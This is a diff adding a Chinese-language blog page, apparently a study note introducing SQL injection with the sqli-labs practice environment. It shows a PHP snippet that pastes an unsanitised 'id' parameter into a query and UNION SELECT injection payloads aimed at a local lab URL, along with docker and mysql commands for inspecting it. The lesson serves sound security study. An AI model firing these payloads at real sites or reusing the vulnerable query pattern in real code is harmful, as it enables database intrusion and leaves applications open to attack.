@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="tea9的博客">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <link rel="dns-prefetch" href="http://tea9.xyz">
+  	<link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/github-gist.css">
+    
+      <link rel="stylesheet" href="/css/prettify.css">
+      <link rel="stylesheet" href="/css/highlight/atelier-savanna-light.min.css">
+    
+    <!--SEO-->
+
+<meta name="description" content="心中有光の孩子"/>
+
+
+<meta name="keywords" content="tea9,tea9的博客,开发,android,安全"/>
+
+
+<meta name="robots" content="all" />
+<meta name="google" content="all" />
+<meta name="googlebot" content="all" />
+<meta name="verify" content="all" />
+    <!--Title-->
+
+
+<title>1.1.1-SQL注入-SQL注入基础-SQL注入原理分析 | tea9的博客</title>
+
+
+    <link rel="alternate" href="/atom.xml" title="tea9的博客" type="application/atom+xml">
+
+
+    <link rel="icon" href="/favicon.ico">
+
+    
+
+
+
+
+
+    
+</head>
+  <body>
+    <div class="container">
+	<header class="header">
+	  <div class="blog-title">
+	    <a href="/"> <img src="/img/logo.png"></a>
+	  </div>
+	  <nav>
+	    <ul class="menu">
+	      
+	        <li class="menu-item">
+	          <a href="/" class="menu-item-link nav-underline">首页</a>
+	        </li>&sdot;
+	      
+	        <li class="menu-item">
+	          <a href="/archives" class="menu-item-link nav-underline">归档</a>
+	        </li>&sdot;
+	      
+	        <li class="menu-item">
+	          <a href="/links" class="menu-item-link nav-underline">友链</a>
+	        </li>&sdot;
+	      
+	      	<li class="menu-item">
+	          <a href="/about" class="menu-item-link nav-underline">关于</a>
+			</li>
+		  
+			&sdot;
+			<li class="menu-item">
+				<a href="/search" class="menu-item-link nav-underline">搜索</a>
+			</li>
+		  
+	    </ul>
+	  </nav>
+	</header>
+</div>
+<hr />
+    <div class="container">	
+	<div class="archive-main">
+	    <div class="archive-title">
+	    	<h2>1.1.1-SQL注入-SQL注入基础-SQL注入原理分析</h2>	    	
+	    </div>
+	    <div class="archive-meta">
+	   	    2018-06-11&nbsp;&nbsp;&sdot;&nbsp;&nbsp; 
+	   	    
+            	<a class="tag" href="/tags/#web安全"title="web安全">web安全</a>&nbsp;&nbsp;
+            
+            	<a class="tag" href="/tags/#sql注入"title="sql注入">sql注入</a>&nbsp;&nbsp;
+            
+	    </div>
+		<hr class="one"/>
+		<div class="archive-content typo">
+			<h2 id="SQL注入原理分析"><a href="#SQL注入原理分析" class="headerlink" title="SQL注入原理分析"></a>SQL注入原理分析</h2><h3 id="SQL注入背景介绍-SQL语言介绍"><a href="#SQL注入背景介绍-SQL语言介绍" class="headerlink" title="SQL注入背景介绍-SQL语言介绍"></a>SQL注入背景介绍-SQL语言介绍</h3><p>sql 结构化查询语言<br>通用的功能极强的关系数据库标准语言<br>功能包括查询、操纵、定义和控制四个方面<br>不需要告诉SQL如何访问数据库，只要告诉SQL需要数据库做什么 </p>
+<h3 id="SQL注入产生原因"><a href="#SQL注入产生原因" class="headerlink" title="SQL注入产生原因"></a>SQL注入产生原因</h3><p>网络技术与信息技术高速发展，B/S模式具有界面统一，使用简单，易于维护，扩展性好，共享度高等优点，B/S模式越来越多的被应用于程序编写中。  </p>
+<ol>
+<li>B/S建立在互联网，对安全控制能力较弱</li>
+<li>开发人员水平和经验参差不齐，没有在编写代码时对用户的输入数据或者页面携带信息进行必要的合法性判断。  </li>
+</ol>
+<p>攻击者利用这个机会<strong>提交一段数据库查询代码</strong>，根据程序返回的结果，就可以获得一些数据库信息。</p>
+<h3 id="SQL注入核心原理"><a href="#SQL注入核心原理" class="headerlink" title="SQL注入核心原理"></a>SQL注入核心原理</h3><p>SQL注入是一种将恶意的SQL代码<strong>插入或添加到应用（用户）的输入参数</strong>的攻击，攻击者探测出开发者编程过程中的漏洞，利用这些漏洞，巧妙的<strong>构造SQL语句</strong>对数据库系统的内容进行直接<strong>检索或修改</strong>。</p>
+<p>灵活的SQL查询语句+用户输入的数据带入了SQL语句=用户直接操作数据库-&gt;<strong>SQL注入漏洞</strong></p>
+<pre><code>select version();
+select id from where id=1;
+select id from jobs where id=1 union select version();
+
+select id.location from jobs where id=1 union select 1,version();  // 1是占位
+</code></pre><p>用户输入可控，代码对用户输入进行了拼接，带入SQL语句，产生SQL注入漏洞</p>
+<p><a href="http://test.com/index.php?id=1*UNION" target="_blank" rel="noopener">http://test.com/index.php?id=1*UNION</a> SELECT 1,version()#*</p>
+<pre><code>$id=$_GET[&#39;id&#39;];// id没做处理
+$sql=&quot;SELECT * FROM users WHEre id=&#39;$id&#39; LIMIT 0,1&quot;
+
+select id,location from jobs where id=1 union select 1,version()#
+</code></pre><p><br></p>
+<pre><code>docker ps --help
+docker ps -a
+docker exec -it &lt;id&gt; /bin/bash
+mysql
+show databases;
+use security;
+show tables;
+
+select * from users;
+select username from users where id=1;
+select username,password from users where id=1;
+
+select 1;
+select 1123;
+select version();
+select username,password from users where id=1 union select version();
+select username,password from users where id=1 union select 1,version();
+
+select * from users where id=1 limit 0,1;
+select * from users where id=-1 union select 1,2,version()# limit 0,1;
+
+// 浏览器
+http://127.0.0.1:90/Less-1/?id=1%27%20union%20select%201,2,3%23
+?id=1&#39; union select 1,2,3
+// %23 #
+
+http://127.0.0.1:90/Less-1/?id=-1%27%20union%20select%201,version(),3%23
+?id=-1&#39; union select 1,version(),3
+// 需要让它出个错
+
+// 控制台
+// 退出mysql
+exit
+
+cd /var/www/html/Less-1
+cat index.php
+vi index.php
+// 编辑
+echo $sql
+:wq
+</code></pre><p>todo sqli-labs源码地址</p>
+<pre><code>docker ps -a
+docker exec -it &lt;id&gt; /bin/bash
+cd /var/www/html/Less-1
+</code></pre> 
+		</div>
+		
+		    <div id="comments">
+		        
+   <p>评论系统未开启，无法评论！</p>
+
+		    </div>
+		
+	</div>
+</div>
+<div id="toc">
+    <div class="archive-toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入原理分析"><span class="toc-text">SQL注入原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入背景介绍-SQL语言介绍"><span class="toc-text">SQL注入背景介绍-SQL语言介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入产生原因"><span class="toc-text">SQL注入产生原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入核心原理"><span class="toc-text">SQL注入核心原理</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+		<hr />
+<div class="footer">
+  
+</div>
+<script src="/js/jquery.min.js"></script>
+ <script src="/js/prettify.js"></script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $("pre").addClass(
+      "prettyprint linenums"
+    );
+    prettyPrint();
+  });
+</script>
+
+
+		<div class="copyright">
+	Copyright &copy; 2019 . <br />Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>&nbsp;&nbsp;&sdot;&nbsp;&nbsp;Theme is <a href="https://github.com/praming/hexo-theme-Ice" target="_blank">Ice</a>
+</div>
+  <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":200,"height":350},"mobile":{"show":true},"log":false});</script></body>
+</html>
